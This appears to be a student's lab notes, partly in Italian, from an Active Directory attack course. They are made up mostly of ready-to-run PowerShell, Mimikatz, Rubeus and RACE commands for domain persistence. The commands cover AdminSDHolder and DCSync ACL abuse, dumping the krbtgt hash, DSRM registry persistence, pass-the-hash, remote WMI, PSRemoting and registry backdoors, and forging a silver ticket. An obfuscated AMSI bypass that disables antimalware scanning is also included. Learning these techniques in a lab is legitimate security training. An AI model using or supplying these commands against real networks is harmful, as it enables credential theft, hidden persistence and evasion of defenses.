*tools*
- [samratashok/ADModule: Microsoft signed ActiveDirectory PowerShell module (github.com)](https://github.com/samratashok/ADModule)
- [samratashok/RACE: RACE is a PowerShell module for executing ACL attacks against Windows targets. (github.com)](https://github.com/samratashok/RACE)
- [PowershellMafia/PowerView (github.com)](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### **CUSTOM SSP**
*With MimiKatz*
o uso di mimilib.dll o 
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```
### **ACLs – AdminSDHolder**
Modifica le acl per aggiungerti il permesso di full control sull'user
*Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA*
```PowerView
Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName student1 -Rights All -Verbose
```
*Using ActiveDirectory Module and Set-ADACL*
```AD_module
Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,D C=local' -Principal student1 -Verbose
```
*Use of race toolkit*
```AD_module
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```


### **ACLs – Right Abuse**
*Add FullControl rights*
Usando powershell
```Powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName student1 -Rights All -Verbose
```
Using ActiveDirectory Module and Set-ADACL
```AD_module
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -Verbose
```
*Add rights for DCSync*
usando powershell
```Powershell
Add-ObjectAcl -TargetDistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' - PrincipalSamAccountName student1 -Rights DCSync -Verbose
```
Using ActiveDirectory Module and Set-ADACL
```AD_module
Set-ADACL -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Principal student1 -GUIDRight DCSync -Verbose
```
Poi avvia DCSync  con mimikatz
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### **DC persistence by abusing the DSRM service.**
Firtsly dump the hashes from the dc
Open a session on the dc
```powershell
. C:\AD\Tools\Invoke-Mimi.ps1
```
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /user:<ADMIN USER> /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe"'
```
or using Rubeus
```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:<ADMIN USER> /aes256:>aes256 HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Launch Invishell e establish the session
```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```
```powershell
$sess = New-PSSession dcorp-dc
```
Bypass the AMSI
```powershell
Enter-PSSession -Session $sess
```
```powershell
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
```powershell
exit
```
Load and launch Invoke-Mimi
```powershell
Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $sess
```
```powershell
Enter-PSSession -Session $sess
```
```powershell
Invoke-Mimi -Command '"token::elevate" "lsadump::sam"'
```
The DSRM administrator is not allowed to logon to the DC from network. So we need to change the logon behavior for the account by modifying registry on the DC
```powershell
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
![[Pasted image 20231025115059.png]]
Now from the attack box we can simply pas the hash and use the dsrm administrator session
```powershell
Invoke-Mimi -Command '"sekurlsa::pth /domain:<MACCHINA> /user:Administrator /ntlm:<HASH> /run:powershell.exe"'
```
```powershell
ls \\<MACCHINA>\c$
```

### **Grant remote access to a stupid user**
Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.
Open a session with invoke-mimi or rubeus and launch invishell.
import the RACE.ps1 module
```powershell
. C:\AD\Tools\RACE.ps1
```
And modify the service
```powershell
Set-RemoteWMI -SamAccountName <STU

PID USER> -ComputerName <NOME MACCHINA> -namespace 'root\cimv2' -Verbose
```
![[Pasted image 20231025144401.png]]
Now we granted the acces to us
```powershell
gwmi -class win32_operatingsystem -ComputerName <MACCHINA>
```
![[Pasted image 20231025144606.png]]
___
We can do the same but with powershell. After opened the session and imported
```powershell
. C:\AD\Tools\RACE.ps1
```
```powershell
Set-RemotePSRemoting -SamAccountName <STUPID USER> -ComputerName <MACCHINA> -Verbose
```
To check if the command worked
```powershell
Invoke-Command -ScriptBlock{whoami} -ComputerName <MACCHINA>
```
![[Pasted image 20231025145545.png]]


### **Retrieve hash of Machine without admin access**
To retrieve access without Domain admin access we need to modify a permission on the dc
So open a session, import race.ps1 and launche te command.
```powershell
. C:\AD\Tools\RACE.ps1
```
```powershell
Add-RemoteRegBackdoor -ComputerName <MACCHINA> -Trustee <STUPID USER> -Verbose
```
![[Pasted image 20231025150802.png]]
and retrieve the hash
```powershell
. C:\AD\Tools\RACE.ps1
```
```powershell
Get-RemoteMachineAccountHash -ComputerName <NOME MACCHINA> -Verbose
```
![[Pasted image 20231025150902.png]]
and with that we can create a silver ticket for the services (in this case HOST)
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21- 719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:1698fafb9170e4798e43b77ac38cf0bf /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

